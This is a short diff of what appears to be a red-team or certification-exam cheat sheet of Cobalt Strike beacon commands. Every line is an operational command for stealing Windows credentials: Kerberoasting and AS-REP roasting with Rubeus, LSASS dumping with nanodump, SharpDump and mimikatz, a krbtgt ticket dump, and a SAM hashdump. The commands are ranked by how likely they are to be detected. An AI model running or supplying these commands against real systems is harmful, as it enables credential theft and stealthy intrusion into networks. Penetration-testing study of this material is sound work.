@@ -224,9 +224,8 @@ beacon> execute-assembly Rubeus.exe kerberoast /nowrap /outfile:\\127.0.0.1\...
 beacon> execute-assembly Rubeus.exe asreproast /format:hashcat
 
 # LSASS — OPSEC ladder (least to most noisy)
-beacon> inline-execute nanodump.o --write C:\Windows\Temp\<rand>.dmp  # SAFE
-beacon> execute-assembly SharpDump.exe                                  # CAUTION
-beacon> mimikatz sekurlsa::logonpasswords                              # UNSAFE — avoid
+beacon> krb_dump /user:<user> /service:krbtgt   # SAFE — Kerbeus-BOF, Kerberos API, no raw LSASS read
+beacon> mimikatz sekurlsa::logonpasswords        # UNSAFE — avoid on exam
 
 # SAM dump
 beacon> hashdump                             # CAUTION — calls SamConnect
